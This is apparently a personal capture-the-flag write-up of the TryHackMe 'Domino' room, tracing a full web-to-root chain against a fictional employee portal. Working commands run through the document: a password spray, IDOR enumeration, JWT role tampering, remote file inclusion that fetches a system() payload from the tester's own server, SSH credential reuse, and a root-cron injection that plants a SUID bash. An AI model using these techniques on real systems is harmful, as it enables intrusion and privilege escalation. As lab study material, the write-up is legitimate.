# Domino (TryHackMe)

- **Path/module:** Jr Penetration Tester -> **Jr Pentester Challenges**. Premium. A full
  **web-to-root exploit chain** against the fictional *NexusCorp Employee Portal* - every weakness knocks
  over the next (hence "Domino").
- **Date:** 2026-10-26.
- **Status:** SOLVED - all 5 flags. Driven **headless from `C:\CTF`** over the THM VPN (curl + Python
  `urllib`/`hmac` + Paramiko). Target `dominov.13` at **<ip>** (Apache 2.4.58 / PHP / Ubuntu;
  SSH 22 open). No AttackBox needed.

## Flags

| # | Flag | Technique |
|---|---|---|
| 1 | `THM{…}` | IDOR (horizontal access) on the profile API |
| 2 | `THM{…}` | Admin panel via unverified JWT (`role` tamper) |
| 3 | `THM{…}` | RFI -> `eval()` RCE in `files.php` |
| 4 | `THM{…}` | SSH credential reuse (leaked DB password) |
| 5 | `THM{…}` | Root cron running a group-writable script |

## Recon (the misconfigurations that start the chain)

- Login POSTs to `/index.php` (users are `firstname.lastname`). `/team.php` lists the 7 employees
  (`laura.hayes` = CIO/**admin**, `robert.wilson` = DevOps, etc.).
- `/forgot.php` enumerates users ("Reset link sent" vs "No account found"); `/reset.php` token is random
  (not crackable - not the intended path).
- **Directory listing enabled** exposed `/api/users/` (-> `profile.php`), `/api/auth/token.php`,
  `/backup/`, `/static/`.
- `/backup/README.txt` -> `config.enc` is **AES-128-ECB**, key "referenced in `static/app.js`".
- **`static/app.js` leaks everything client-side:** the AES key `<redacted-secret>` (pad to 16 with **null
  bytes**, not spaces), that `nexus_session` is `base64(JSON)` + an HMAC, and that the API uses a JWT from
  `/api/auth/token.php`.
  ```bash
  # decrypt config.enc (null-padded key)
  openssl enc -d -aes-128-ecb -K $(printf '<redacted-secret>\x00\x00' | xxd -p) -in config.enc
  # -> {"...","deploy_env":"production","system_user":"devops"}   (the devops hint)
  ```

## Foothold - weak password

- No SQLi / type-juggling / session forgery / reset bypass. Both logins use `password_verify` (bcrypt).
- A password **spray via the fast JSON API `/api/login.php`** found the weak cred: **`<redacted-pw>`** works for
  `sarah.johnson`, `robert.wilson`, and `emma.taylor`.
  ```bash
  curl -s -X POST http://<ip>/api/login.php -H 'Content-Type: application/json' \
    -d '{"username":"sarah.johnson","password":"<redacted-pw>"}'
  # {"success":true,"username":"sarah.johnson","role":"user"}
  ```
- Web login sets `nexus_session = base64({"user_id":3,"username":"sarah.johnson","role":"user"}).<hmac>`
  and a PHPSESSID. Dashboard reveals the **File Viewer**: `/api/files.php?name=` (JWT-auth) and a
  **My Profile API**.

## Flag 1 - IDOR on the profile API

`/api/users/profile.php` is gated by `require_login()` (the **session cookie**), then runs
`SELECT ... notes FROM users WHERE id = ?` with **no ownership check**. Iterate `id`:
```bash
curl -s -b cookies.txt "http://<ip>/api/users/profile.php?id=1"
# {"id":1,"username":"laura.hayes","role":"admin","notes":"THM{…}"}
```

## Flag 2 - admin panel via a broken JWT

`/api/auth/token.php` (needs a login session) issues `HS256` JWT
`{"sub":"sarah.johnson","role":"user","iat":...,"exp":...}`. **`verify_jwt()` never checks the signature**
- tampering the payload, `alg:none`, and HS256 with any key all pass. Set `role:admin`:
- `/admin/index.php` accepts an admin session cookie **OR** an admin JWT, and the flag is hardcoded in its
  source: **`THM{…}`**.
- (The "blind XSS / session hijack" name is the *intended* path: a `/support` ticket is viewed by
  `admin_bot.py` as laura.hayes, whose cookie is signable with the leaked `APP_SECRET=<redacted-secret>`
  as `base64(JSON).hmac_sha256`. Forging the JWT is the faster route.)

## Flag 3 - RFI -> eval RCE

With an admin JWT, `files.php` is a restricted LFI (`realpath` must start `/var/www/html/`), which leaks
all source - including `config.php` (`DB_PASS=<redacted-secret>`, `JWT_SECRET=<redacted-secret>`) and
`files.php` itself, which contains:
```php
// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name,"http://")===0 || strpos($name,"https://")===0) {
    $remote = @file_get_contents($name);
    ob_start(); eval(str_replace("<?php","",$remote)); echo json_encode(["output"=>ob_get_clean()]);
}
```
Host a payload (`system($_GET["c"]);`) on my VPN IP and point `name` at it -> **RCE as www-data**:
```bash
python -m http.server 8000           # on <ip> (VPN iface)
curl -H "Authorization: Bearer <admin-jwt>" \
  "http://<ip>/api/files.php?name=http://<ip>:8000/payload.php&c=cat%20/opt/flag3.txt"
# {"output":"THM{…}\n"}
```

## Flag 4 - SSH credential reuse

`config.php` leaked `DB_PASS=<redacted-secret>` (devops-themed) and `config.enc` named `system_user: devops`.
That DB password is **reused for the `devops` OS account**:
```bash
ssh devops@<ip>   # password: <redacted-pw>
cat ~/user.txt            # THM{…}
```

## Flag 5 - root via a writable root-cron script

As `devops` (no sudo, standard SUID/caps). `/opt/tools/pspy64` is a hint; `/var/log/nexus_health.log`
updates **every minute**. `/opt/monitoring/health_report.sh` is `-rwxrwxr-- root devops` -> **group-writable
by devops** and run by **root cron** each minute. Inject, wait one minute, cash in:
```bash
cat >> /opt/monitoring/health_report.sh <<'DONE'
cp /bin/bash /tmp/.rb; chmod 6755 /tmp/.rb
cat /root/root.txt > /tmp/.rf; chmod 644 /tmp/.rf
DONE
# ~60s later (SUID bash):
/tmp/.rb -p -c 'id; cat /root/root.txt'
# uid=1001(devops) euid=0(root) ... THM{…}
```
(Restored the script afterwards.)

## Lessons learned

- **Secrets in client-side JS are game over:** `app.js` handed over the AES key, the session format, and the
  JWT endpoint. Chain: dir-listing -> `config.enc` -> `app.js` key -> decrypt -> `devops`.
- **The foothold was the hardest part** - all the logic-flaw shortcuts failed and the answer was a trivial
  password (`<redacted-pw>`). Lesson: include the plainest passwords (lowercase `password`, `123456`) in the
  spray from the start; a themed hint (`<redacted-secret>`) doesn't mean the cred is clever.
- **Two independent "admin" checks, both broken:** the JWT (no signature verification -> tamper `role`) and
  the `nexus_session` cookie (HMAC with the leaked `APP_SECRET`). Either forges admin.
- **`eval(file_get_contents($url))` = instant RCE** once you can set `role:admin`; `allow_url_fopen` makes
  the RFI remote.
- **Credential reuse bridges web -> OS:** a *DB* password doubling as the *devops login* is the lateral move.
- **Writable file + root cron = root.** Check group ownership, not just world-write (`rwxrwxr-- root
  devops` is writable to anyone in `devops`). `pspy64` left in `/opt/tools` was the author's nudge.
- **Headless the whole way:** curl for web, Python `hmac`/`base64` to forge JWTs offline (no signature to
  crack - the server didn't verify it), a `python -m http.server` on the VPN IP for the RFI, and Paramiko
  for SSH + the cron-wait loop (remote `sleep`, not local). See [[ctf-workspace-dir]].

## Related

- [[tryhackme-learning-buddy]] / [[always-doc-rooms]] / [[ctf-workspace-dir]]. JWT/session-forgery echoes
  the AI/cloud headless work; IDOR + access-control themes connect to [[the-blue-team-perspective]] and the
  [[writing-pentest-reports]] vuln classes. Prior n8n RCE chain: [[cypheron-nightmare-task3]].
